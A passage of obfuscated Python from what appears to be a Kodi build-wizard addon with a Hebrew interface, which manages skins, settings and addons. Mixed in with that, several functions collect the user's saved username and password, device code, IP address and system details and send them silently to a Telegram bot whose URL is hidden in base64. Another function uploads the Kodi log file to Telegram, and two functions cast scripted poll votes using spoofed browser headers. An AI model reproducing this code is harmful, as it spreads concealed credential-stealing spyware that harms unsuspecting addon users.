        if OO00O00OO00OO0000 ==OOOO00OOO00000000 :#line:561
            O00OOOOOO0O000OOO ='system_name'#line:562
            OOOOOO000O00O0O00 =1 #line:563
            break #line:564
        if OO00O00OO00OO0000 ==O0OO0000OO0OO0000 :#line:565
            O00OOOOOO0O000OOO ='hardware_code'#line:566
            OOOOOO000O00O0O00 =1 #line:567
            break #line:568
        if OO00O00OO00OO0000 ==O0O00OOO0OO00OO0O :#line:569
            O00OOOOOO0O000OOO ='username'#line:570
            OOOOOO000O00O0O00 =1 #line:571
            break #line:572
        if OO00O00OO00OO0000 ==OOO000O0OOOOO0OO0 :#line:573
            O00OOOOOO0O000OOO ='password'#line:574
            OOOOOO000O00O0O00 =1 #line:575
            break #line:576
    if OOOOOO000O00O0O00 ==1 :#line:577
       OO0000OO000O0O00O =base64 .b64decode ("aHR0cDovL2tvZGkubGlmZS93aXphcmQvcGFzc3gueG1s").decode ('utf-8')#line:579
       O0000O0OOO00OO0OO =urlopen (OO0000OO000O0O00O )#line:580
       O0O0OOOO00000OO00 =O0000O0OOO00OO0OO .readlines ()#line:581
       xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:582
       if not wiz_up :#line:583
        if BUILDNAME =="":#line:584
            gomsb_go2 (O00OOOOOO0O000OOO +O00O000OOOOO00O00 )#line:585
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]סיסמה לא נכונה.[/COLOR]'%COLOR2 )#line:586
            ADDON .openSettings ()#line:587
       sys .exit ()#line:588
def builde_Votes ():#line:589
   try :#line:590
        import requests #line:591
        O00OO0O0O0OO0000O ='45534033'#line:592
        O0000000OO00O00O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO0O0O0OO0000O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:604
        OO0OOOO0OO00O0000 ='256031424'#line:606
        OOOO0000O00OOOO0O ={'options':OO0OOOO0OO00O0000 }#line:612
        OO0OOOOOO0O000O0O =requests .post ('https://www.strawpoll.me/'+O00OO0O0O0OO0000O ,headers =O0000000OO00O00O0 ,data =OOOO0000O00OOOO0O )#line:614
   except :pass #line:615
def fix_Dialog_Settings17 ():#line:618
  if KODIV >=17 and KODIV <18 :#line:626
      OO0OOO0OOO00OO0O0 =os .path .join (translatepath ("special://home/"),"addons","plugin.program.Anonymous","skinfix","17","DialogAddonSettings.xml")#line:628
      OOOOOOO00OO0000O0 =os .path .join (translatepath ("special://home/"),"addons","skin.Premium.mod","16x9","DialogAddonSettings.xml")#line:629
      copyfile (OO0OOO0OOO00OO0O0 ,OOOOOOO00OO0000O0 )#line:631
def gomsb ():#line:639
       try :#line:640
          import json #line:641
          wiz .log ('FRESH MESSAGE')#line:642
          OOOOOOO0000O0O0O0 =(wiz .getS ("user"))#line:643
          O0O00OOO0OO00O000 =(wiz .getS ("pass"))#line:644
          OO0O0O0O0O000O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:645
          O0O00OOOOOOO0OO0O =platform .uname ()#line:646
          O0O0O0000OOOO0OO0 =O0O00OOOOOOO0OO0O [1 ]#line:647
          O00O00OO0O0O0000O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:648
          OO0OOOO0OOOO0O000 =urlopen ('https://api.ipify.org/?format=json').read ()#line:649
          O00000OO0OO0000O0 =str (json .loads (OO0OOOO0OOOO0O000 )['ip'])#line:650
          O0OOO0O0000O00000 =OOOOOOO0000O0O0O0 #line:651
          OO0OO0O0O0OOOO0OO =O0O00OOO0OO00O000 #line:652
          import socket #line:653
          OO0OOOO0OOOO0O000 =urlopen (O00O00OO0O0O0000O +que ('ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר :')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OOO0O0000O00000 +que (' סיסמה: ')+OO0OO0O0O0OOOO0OO +que (' קודי: ')+OO0O0O0O0O000O000 +que (' כתובת: ')+O00000OO0OO0000O0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0O0O0000OOOO0OO0 ).readlines ()#line:654
       except :pass #line:656
def gomsb_go ():#line:657
       try :#line:658
          import json #line:659
          wiz .log ('FRESH MESSAGE')#line:660
          O00OO000OO0O0O0OO =(wiz .getS ("user"))#line:661
          OOOOO00000O00OOO0 =(wiz .getS ("pass"))#line:662
          O0OO0OOO0O0OOOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:663
          O000O0000OOOO00O0 =platform .uname ()#line:664
          O0000O000O00OO0O0 =O000O0000OOOO00O0 [1 ]#line:665
          OOO00O0O00O00OO0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:666
          O00O000O00O00OOO0 =urlopen ('https://api.ipify.org/?format=json').read ()#line:667
          O00O00O0O000000OO =str (json .loads (O00O000O00O00OOO0 )['ip'])#line:668
          OOO0O00OOOOO0OO0O =O00OO000OO0O0O0OO #line:669
          O00000OO0O0O00000 =OOOOO00000O00OOO0 #line:670
          import socket #line:671
          O00O000O00O00OOO0 =urlopen (OOO00O0O00O00OO0O +que ('ההורדה חסומה: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOO0O00OOOOO0OO0O +que (' סיסמה: ')+O00000OO0O0O00000 +que (' קודי: ')+O0OO0OOO0O0OOOOOO +que (' כתובת: ')+O00O00O0O000000OO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0000O000O00OO0O0 ).readlines ()#line:672
       except :pass #line:674
def gomsb_go2 (OO00000O00000OO00 ):#line:675
       try :#line:676
          import json #line:677
          wiz .log ('FRESH MESSAGE')#line:678
          O0OOOO0O0000O00O0 =(wiz .getS ("user"))#line:679
          OO0O0OOO0OOOO0O00 =(wiz .getS ("pass"))#line:680
          O0O000O0OO0O00OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:681
          O00O000O00000O000 =platform .uname ()#line:682
          OO0OO0OO00O0O00O0 =O00O000O00000O000 [1 ]#line:683
          OOOO0OO00OOO0O0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:684
          O00O0000000O0O00O =urlopen ('https://api.ipify.org/?format=json').read ()#line:685
          OOOOOO0OOOO0O00OO =str (json .loads (O00O0000000O0O00O )['ip'])#line:686
          OOOOO000OO00OOOOO =O0OOOO0O0000O00O0 #line:687
          OO000OO00OO0000OO =OO0O0OOO0OOOO0O00 #line:688
          import socket #line:689
          O00O0000000O0O00O =urlopen (OOOO0OO00OOO0O0O0 +que ('חסימה על ידי: '+OO00000O00000OO00 +' -')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOOO000OO00OOOOO +que (' סיסמה: ')+OO000OO00OO0000OO +que (' קודי: ')+O0O000O0OO0O00OO0 +que (' כתובת: ')+OOOOOO0OOOO0O00OO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0OO0OO00O0O00O0 +que (' גירסת ויזארד: ')+VERSION ).readlines ()#line:690
       except :pass #line:691
def read_firebase_c (OOO00O0O0OOO00O0O ):#line:692
    from resources .libs import firebase #line:693
    O0O0O0OO00O00OO0O =firebase .FirebaseApplication ('https://zxcsd-3bae5-default-rtdb.firebaseio.com',None )#line:694
    O0O0OO00OO000O00O =O0O0O0OO00O00OO0O .get ('/',None )#line:695
    if OOO00O0O0OOO00O0O in O0O0OO00OO000O00O :#line:696
        return O0O0OO00OO000O00O [OOO00O0O0OOO00O0O ]#line:697
    else :#line:698
        return {}#line:699
def readcode ():#line:700
    OOOO000OO0O0OO000 =read_firebase_c ('telecode')#line:701
    OO00O0OOO0OOO0OOO =[]#line:702
    for OOO0000OO0O00OO0O in OOOO000OO0O0OO000 :#line:703
        O000OOOO0O0O0O0O0 =OOOO000OO0O0OO000 [OOO0000OO0O00OO0O ]#line:704
        OO00O0OOO0OOO0OOO .append ((O000OOOO0O0O0O0O0 ['pin']))#line:705
    for O00OO0OOO00O00OOO in OO00O0OOO0OOO0OOO :#line:706
       return O00OO0OOO00O00OOO #line:707
def check_firebase ():#line:711
     if len (wiz .getS ("sync_user"))>0 and wiz .getS ("pass2")=='true':#line:713
        try :#line:715
            OO00OO0O0OO0000OO =read_firebase ('table_name')#line:716
        except :#line:717
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Anonymous TV'),'[COLOR %s]שם המשתמש של הסנכרון שגוי[/COLOR]'%COLOR2 )#line:718
            if KODI_VERSION <=18 :#line:719
                OOO0OO00000O0O0O0 =DIALOG .yesno ("%s"%'בעיה בשם המשתמש של הסנכרון',"[COLOR %s]שם המשתמש של הסנכרון אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR yellow]אישור[/COLOR][/B]')#line:720
            else :#line:721
                OOO0OO00000O0O0O0 =DIALOG .yesno ('בעיה בשם המשתמש של הסנכרון',"שם המשתמש של [B][COLOR red]הסנכרון[/COLOR][/B] אינו נכון,"+'\n'+"הכנס את שם המשתמש כעת.","ביטול",yeslabel ='[B][COLOR yellow]אישור[/COLOR][/B]')#line:722
            if BUILDNAME =="":#line:725
                xbmc .executebuiltin ("ActivateWindow(home)")#line:726
            if OOO0OO00000O0O0O0 :#line:727
               ADDON .openSettings ()#line:728
               sys .exit ()#line:729
            else :#line:730
             sys .exit ()#line:731
def indicatorVotes ():#line:733
   try :#line:734
        import requests #line:735
        O0O0OO00O0OO0O0OO ='42244359'#line:736
        OOOO0O0OO00000O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0O0OO00O0OO0O0OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:748
        O00000OOO0000OOO0 ='247106541'#line:750
        OOOOOO00OOOOO0O0O ={'options':O00000OOO0000OOO0 }#line:756
        O00OO0O0O00O0OOO0 =requests .post ('https://www.strawpoll.me/'+O0O0OO00O0OO0O0OO ,headers =OOOO0O0OO00000O0O ,data =OOOOOO00OOOOO0O0O )#line:758
   except :pass #line:759
def autotrakt ():#line:760
    OOOOO00O00OOO00O0 =(wiz .getS ("auto_trk"))#line:761
    if OOOOO00O00OOO00O0 =='true':#line:762
       from resources .libs import trk_aut #line:763
def traktsync ():#line:765
     O000000OO0O0O0OOO =(wiz .getS ("auto_trk"))#line:766
     if O000000OO0O0O0OOO =='false':#line:767
       ADDON .openSettings ()#line:768
     from resources .libs import trk_aut #line:769
def imdb_synck ():#line:771
   try :#line:772
     OO0O0OOOO0OO000O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:773
     O0000OOOO0OOOO0O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:774
     OO00O000O000OO000 =(wiz .getS ("imdb_sync"))#line:775
     O0OOOO00O00OOO00O ="imdb.user"#line:776
     O00OOOO0OO00O0O0O ="accounts.informants.imdb.user"#line:777
     OO0O0OOOO0OO000O0 .setSetting (O0OOOO00O00OOO00O ,str (OO00O000O000OO000 ))#line:778
     O0000OOOO0OOOO0O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:779
     O0000OOOO0OOOO0O0 .setSetting (O00OOOO0OO00O0O0O ,str (OO00O000O000OO000 ))#line:780
   except :pass #line:781
def dis_or_enable_addon (O0OOOO0OOOO0O00O0 ,OOOO0OOO00000OOO0 ,enable ="true"):#line:783
    import json #line:784
    OO0O0O0OOO0OOO000 ='"%s"'%O0OOOO0OOOO0O00O0 #line:785
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOO0OOOO0O00O0 )and enable =="true":#line:786
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOOO0OOOO0O00O0 )#line:788
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOO0OOOO0O00O0 )and enable =="false":#line:789
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOOO0OOOO0O00O0 )#line:790
    else :#line:791
        O0O0OOOOO0O000OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0O0O0OOO0OOO000 ,enable )#line:792
        OOO0O0O00O000OO0O =xbmc .executeJSONRPC (O0O0OOOOO0O000OOO )#line:793
        OOO00O0OOOO0OOO00 =json .loads (OOO0O0O00O000OO0O )#line:794
        if enable =="true":#line:795
            xbmc .log ("### Enabled %s, response = %s"%(O0OOOO0OOOO0O00O0 ,OOO00O0OOOO0OOO00 ))#line:796
        else :#line:797
            xbmc .log ("### Disabled %s, response = %s"%(O0OOOO0OOOO0O00O0 ,OOO00O0OOOO0OOO00 ))#line:798
    if OOOO0OOO00000OOO0 =='auto':#line:799
     return True #line:800
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:801
def howsentlog ():#line:805
       try :#line:807
          import json #line:808
          OO000OOO0O000000O =(wiz .getS ("user"))#line:809
          O0OOO00O0OO0O000O =(wiz .getS ("pass"))#line:810
          OO0O0OO0O00O0OO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:811
          O0OOOOO00OOOO00O0 =platform .uname ()#line:812
          OO00O00OO0OO0OOOO =O0OOOOO00OOOO00O0 [1 ]#line:813
          OOO0O000O00000OOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:814
          O0OO0000000000OOO =urlopen ('https://api.ipify.org/?format=json').read ()#line:815
          OO0O000000O0OOOOO =str (json .loads (O0OO0000000000OOO )['ip'])#line:816
          O0O000O00O000000O =OO000OOO0O000000O #line:817
          OO0OOOOO0OOOO00OO =O0OOO00O0OO0O000O #line:818
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:819
          xbmc .sleep (1500 )#line:820
          OO0OO0O0OOOO0O0O0 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:821
          import socket #line:823
          O0OO0000000000OOO =urlopen (OOO0O000O00000OOO +que ('שלח לוג: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0O000O00O000000O +que (' סיסמה: ')+OO0OOOOO0OOOO00OO +que (' קודי: ')+OO0O0OO0O00O0OO00 +que (' כתובת: ')+OO0O000000O0OOOOO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO00O00OO0OO0OOOO +que (' גירסת ויזארד: ')+VERSION ).readlines ()#line:824
       except :pass #line:826
def logsend ():#line:828
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:829
      xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:830
      try :#line:831
          O0O00000O0OOOO0O0 =xbmcgui .DialogBusy ()#line:832
          O0O00000O0OOOO0O0 .create ()#line:833
      except :pass #line:834
      if not os .path .exists (translatepath ("special://home/addons/")+'script.module.requests'):#line:835
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:836
        sys .exit ()#line:837
      howsentlog ()#line:839
      import requests #line:840
      if xbmc .getCondVisibility ('system.platform.windows'):#line:841
         O0O000O00OOO00O00 =xbmc .translatePath ('special://home/kodi.log')#line:842
         O000O0OOO00000O00 ={'chat_id':(None ,'-274262389'),'document':(O0O000O00OOO00O00 ,open (O0O000O00OOO00O00 ,'rb')),}#line:846
         O00OO0O0O00O0O000 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:847
         O0OOO00O0O000OOOO =requests .post (O00OO0O0O00O0O000 ,files =O000O0OOO00000O00 )#line:849
      elif xbmc .getCondVisibility ('system.platform.android'):#line:850
           O0O000O00OOO00O00 =xbmc .translatePath ('special://temp/kodi.log')#line:851
           O000O0OOO00000O00 ={'chat_id':(None ,'-274262389'),'document':(O0O000O00OOO00O00 ,open (O0O000O00OOO00O00 ,'rb')),}#line:855
           O00OO0O0O00O0O000 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:856
           O0OOO00O0O000OOOO =requests .post (O00OO0O0O00O0O000 ,files =O000O0OOO00000O00 )#line:858
      else :#line:859
           O0O000O00OOO00O00 =xbmc .translatePath ('special://kodi.log')#line:860
           O000O0OOO00000O00 ={'chat_id':(None ,'-274262389'),'document':(O0O000O00OOO00O00 ,open (O0O000O00OOO00O00 ,'rb')),}#line:864
           O00OO0O0O00O0O000 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:865
           O0OOO00O0O000OOOO =requests .post (O00OO0O0O00O0O000 ,files =O000O0OOO00000O00 )#line:867
      xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:868
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:869
def rdoff ():#line:871
	O00OO0O0O0O0OOOO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:902
	OO00OOOO00OO0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:903
	copyfile (O00OO0O0O0O0OOOO0 ,OO00OOOO00OO0OO0O )#line:904
def skindialogsettind18 ():#line:905
	try :#line:906
		OO0O0O0OOOOO000OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:907
		O0O000OO00O0OOO00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:908
		copyfile (OO0O0O0OOOOO000OO ,O0O000OO00O0OOO00 )#line:909
	except :pass #line:910
def rdon ():#line:911
	loginit .loginIt ('restore','all')#line:912
	O0O0OO0OOO0OO00O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:914
	OO0O0O000OOO00000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:915
	copyfile (O0O0OO0OOO0OO00O0 ,OO0O0O000OOO00000 )#line:916
def rdbuildinstall ():#line:920
  try :#line:921
   OOOOOOO00O0OO0000 =(wiz .getS ("auto_rd"))#line:922
   if OOOOOOO00O0OO0000 =='true':#line:923
     O0OOO0OO000000OO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     O00O0O0O0OOO0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (O0OOO0OO000000OO0 ,O00O0O0O0OOO0O000 )#line:926
  except :#line:927
     pass #line:928
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:929
def rdbuildinstalloff ():#line:932
    try :#line:933
       OOO00O0O0OOO0O0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:934
       O00000O0OOO00OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:935
       copyfile (OOO00O0O0OOO0O0O0 ,O00000O0OOO00OOO0 )#line:937
       OOO00O0O0OOO0O0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:939
       O00000O0OOO00OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:940
       copyfile (OOO00O0O0OOO0O0O0 ,O00000O0OOO00OOO0 )#line:942
       OOO00O0O0OOO0O0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:944
       O00000O0OOO00OOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:945
       copyfile (OOO00O0O0OOO0O0O0 ,O00000O0OOO00OOO0 )#line:947
       OOO00O0O0OOO0O0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:950
       O00000O0OOO00OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:951
       copyfile (OOO00O0O0OOO0O0O0 ,O00000O0OOO00OOO0 )#line:953
    except :#line:955
       pass #line:956
def rdbuildinstallON ():#line:958
    try :#line:960
       O0OO00OOO0O0OOOO0 =ADDONPATH +"/resources/rd/victory.xml"#line:961
       OO0O0000OO0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:962
       copyfile (O0OO00OOO0O0OOOO0 ,OO0O0000OO0OO0OO0 )#line:964
       O0OO00OOO0O0OOOO0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:966
       OO0O0000OO0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:967
       copyfile (O0OO00OOO0O0OOOO0 ,OO0O0000OO0OO0OO0 )#line:969
       O0OO00OOO0O0OOOO0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:971
       OO0O0000OO0OO0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:972
       copyfile (O0OO00OOO0O0OOOO0 ,OO0O0000OO0OO0OO0 )#line:974
       O0OO00OOO0O0OOOO0 =ADDONPATH +"/resources/rd/Splash.png"#line:977
       OO0O0000OO0OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:978
       copyfile (O0OO00OOO0O0OOOO0 ,OO0O0000OO0OO0OO0 )#line:980
    except :#line:982
       pass #line:983
def rdbuild ():#line:993
	O0O0O00O0O000000O =(wiz .getS ("auto_rd"))#line:994
	if O0O0O00O0O000000O =='true':#line:995
		OOOO0OO0OO00O00O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:996
		OOOO0OO0OO00O00O0 .setSetting ('all_t','0')#line:997
		OOOO0OO0OO00O00O0 .setSetting ('rd_menu_enable','false')#line:998
		OOOO0OO0OO00O00O0 .setSetting ('magnet_bay','false')#line:999
		OOOO0OO0OO00O00O0 .setSetting ('magnet_extra','false')#line:1000
		OOOO0OO0OO00O00O0 .setSetting ('rd_only','false')#line:1001
		OOOO0OO0OO00O00O0 .setSetting ('ftp','false')#line:1003
		OOOO0OO0OO00O00O0 .setSetting ('fp','false')#line:1004
		OOOO0OO0OO00O00O0 .setSetting ('filter_fp','false')#line:1005
		OOOO0OO0OO00O00O0 .setSetting ('fp_size_en','false')#line:1006
		OOOO0OO0OO00O00O0 .setSetting ('afdah','false')#line:1007
		OOOO0OO0OO00O00O0 .setSetting ('ap2s','false')#line:1008
		OOOO0OO0OO00O00O0 .setSetting ('cin','false')#line:1009
		OOOO0OO0OO00O00O0 .setSetting ('clv','false')#line:1010
		OOOO0OO0OO00O00O0 .setSetting ('cmv','false')#line:1011
		OOOO0OO0OO00O00O0 .setSetting ('dl20','false')#line:1012
		OOOO0OO0OO00O00O0 .setSetting ('esc','false')#line:1013
		OOOO0OO0OO00O00O0 .setSetting ('extra','false')#line:1014
		OOOO0OO0OO00O00O0 .setSetting ('film','false')#line:1015
		OOOO0OO0OO00O00O0 .setSetting ('fre','false')#line:1016
		OOOO0OO0OO00O00O0 .setSetting ('fxy','false')#line:1017
		OOOO0OO0OO00O00O0 .setSetting ('genv','false')#line:1018
		OOOO0OO0OO00O00O0 .setSetting ('getgo','false')#line:1019
		OOOO0OO0OO00O00O0 .setSetting ('gold','false')#line:1020
		OOOO0OO0OO00O00O0 .setSetting ('gona','false')#line:1021
		OOOO0OO0OO00O00O0 .setSetting ('hdmm','false')#line:1022
		OOOO0OO0OO00O00O0 .setSetting ('hdt','false')#line:1023
		OOOO0OO0OO00O00O0 .setSetting ('icy','false')#line:1024
		OOOO0OO0OO00O00O0 .setSetting ('ind','false')#line:1025
		OOOO0OO0OO00O00O0 .setSetting ('iwi','false')#line:1026
		OOOO0OO0OO00O00O0 .setSetting ('jen_free','false')#line:1027
		OOOO0OO0OO00O00O0 .setSetting ('kiss','false')#line:1028
		OOOO0OO0OO00O00O0 .setSetting ('lavin','false')#line:1029
		OOOO0OO0OO00O00O0 .setSetting ('los','false')#line:1030
		OOOO0OO0OO00O00O0 .setSetting ('m4u','false')#line:1031
		OOOO0OO0OO00O00O0 .setSetting ('mesh','false')#line:1032
		OOOO0OO0OO00O00O0 .setSetting ('mf','false')#line:1033
		OOOO0OO0OO00O00O0 .setSetting ('mkvc','false')#line:1034
		OOOO0OO0OO00O00O0 .setSetting ('mjy','false')#line:1035
		OOOO0OO0OO00O00O0 .setSetting ('hdonline','false')#line:1036
		OOOO0OO0OO00O00O0 .setSetting ('moviex','false')#line:1037
		OOOO0OO0OO00O00O0 .setSetting ('mpr','false')#line:1038
		OOOO0OO0OO00O00O0 .setSetting ('mvg','false')#line:1039
		OOOO0OO0OO00O00O0 .setSetting ('mvl','false')#line:1040
		OOOO0OO0OO00O00O0 .setSetting ('mvs','false')#line:1041
		OOOO0OO0OO00O00O0 .setSetting ('myeg','false')#line:1042
		OOOO0OO0OO00O00O0 .setSetting ('ninja','false')#line:1043
		OOOO0OO0OO00O00O0 .setSetting ('odb','false')#line:1044
		OOOO0OO0OO00O00O0 .setSetting ('ophd','false')#line:1045
		OOOO0OO0OO00O00O0 .setSetting ('pks','false')#line:1046
		OOOO0OO0OO00O00O0 .setSetting ('prf','false')#line:1047
		OOOO0OO0OO00O00O0 .setSetting ('put18','false')#line:1048
		OOOO0OO0OO00O00O0 .setSetting ('req','false')#line:1049
		OOOO0OO0OO00O00O0 .setSetting ('rftv','false')#line:1050
		OOOO0OO0OO00O00O0 .setSetting ('rltv','false')#line:1051
		OOOO0OO0OO00O00O0 .setSetting ('sc','false')#line:1052
		OOOO0OO0OO00O00O0 .setSetting ('seehd','false')#line:1053
		OOOO0OO0OO00O00O0 .setSetting ('showbox','false')#line:1054
		OOOO0OO0OO00O00O0 .setSetting ('shuid','false')#line:1055
		OOOO0OO0OO00O00O0 .setSetting ('sil_gh','false')#line:1056
		OOOO0OO0OO00O00O0 .setSetting ('spv','false')#line:1057
		OOOO0OO0OO00O00O0 .setSetting ('subs','false')#line:1058
		OOOO0OO0OO00O00O0 .setSetting ('tvs','false')#line:1059
		OOOO0OO0OO00O00O0 .setSetting ('tw','false')#line:1060
		OOOO0OO0OO00O00O0 .setSetting ('upto','false')#line:1061
		OOOO0OO0OO00O00O0 .setSetting ('vel','false')#line:1062
		OOOO0OO0OO00O00O0 .setSetting ('vex','false')#line:1063
		OOOO0OO0OO00O00O0 .setSetting ('vidc','false')#line:1064
		OOOO0OO0OO00O00O0 .setSetting ('w4hd','false')#line:1065
		OOOO0OO0OO00O00O0 .setSetting ('wav','false')#line:1066
		OOOO0OO0OO00O00O0 .setSetting ('wf','false')#line:1067
		OOOO0OO0OO00O00O0 .setSetting ('wse','false')#line:1068
		OOOO0OO0OO00O00O0 .setSetting ('wss','false')#line:1069
		OOOO0OO0OO00O00O0 .setSetting ('wsse','false')#line:1070
		OOOO0OO0OO00O00O0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1071
		OOOO0OO0OO00O00O0 .setSetting ('debrid.only','true')#line:1072
		OOOO0OO0OO00O00O0 .setSetting ('hosts.captcha','false')#line:1073
		OOOO0OO0OO00O00O0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1074
		OOOO0OO0OO00O00O0 .setSetting ('provider.123moviehd','false')#line:1075
		OOOO0OO0OO00O00O0 .setSetting ('provider.300mbdownload','false')#line:1076
		OOOO0OO0OO00O00O0 .setSetting ('provider.alltube','false')#line:1077
		OOOO0OO0OO00O00O0 .setSetting ('provider.allucde','false')#line:1078
		OOOO0OO0OO00O00O0 .setSetting ('provider.animebase','false')#line:1079
